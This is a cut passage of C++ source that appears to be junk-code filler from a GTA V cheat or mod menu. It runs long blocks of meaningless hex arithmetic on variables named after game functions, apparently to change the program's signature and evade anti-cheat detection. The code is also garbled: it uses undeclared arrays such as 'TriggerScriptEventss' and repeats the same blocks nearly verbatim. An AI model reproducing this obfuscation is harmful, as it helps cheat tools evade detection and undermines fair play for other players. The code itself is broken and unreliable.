				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			if (Extern_Reader::File_Manager::ArquivoExiste("IP.txt"))
			{
				if (offset > aaaaaa)
				{
					matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
					matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
					matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
				}
				else
				{
					offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
					offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
					offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
					offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
				if (matriz[4] > 50.0f)
				{
					matriz[4] = matriz[1];
				}
				a2 = (matriz[4]) / (2 * matriz[2]);
				a1 = (matriz[3] + (2)) / (2 * matriz[2]);
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (matriz[3] + (5)) / (2 * matriz[2]);
				aaaaaa = ponteiro * 2;
				a = 0.0f;
				a1 = (matriz[3] + (4)) / (2 * matriz[2]);
				b = 0.0f;
				matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
				matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
				matriz[4] = matriz[1];
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				a2 = (matriz[4] + (2)) / (2 * matriz[2]);
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > aaaaaa)
				{
				}
				else
					a1 = (matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (matriz[4] - (3)) / (2 * matriz[2]);

				if (matriz[1] > aaaaaa)
				{
					matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
					matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
					matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
				}
				else
				{
					matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
					matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				}
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
				a = 0.0f;
				b = 0.0f;
				if (matriz[4] > 50.0f)
				{
					matriz[4] = matriz[1];
				}
				a2 = (matriz[4]) / (2 * matriz[2]);
				a1 = (matriz[3] + (2)) / (2 * matriz[2]);
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (matriz[3] + (5)) / (2 * matriz[2]);
				aaaaaa = 0xB2 * 2;
				a = 0.0f;
				a1 = (matriz[3] + (4)) / (2 * matriz[2]);
				b = 0.0f;
				matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
				matriz[4] = matriz[1];
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				a2 = (matriz[4] + (2)) / (2 * matriz[2]);
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				if (matriz[1] > aaaaaa)
				{
				}
				else
					a1 = (matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (matriz[4] - (3)) / (2 * matriz[2]);

				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
				}
				else
				{
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
					offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
				if (GTA5_exe_sig_[4] > 50.0f)
				{
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				}
				a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
				a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
				a = 0.0f;
				a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				b = 0.0f;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
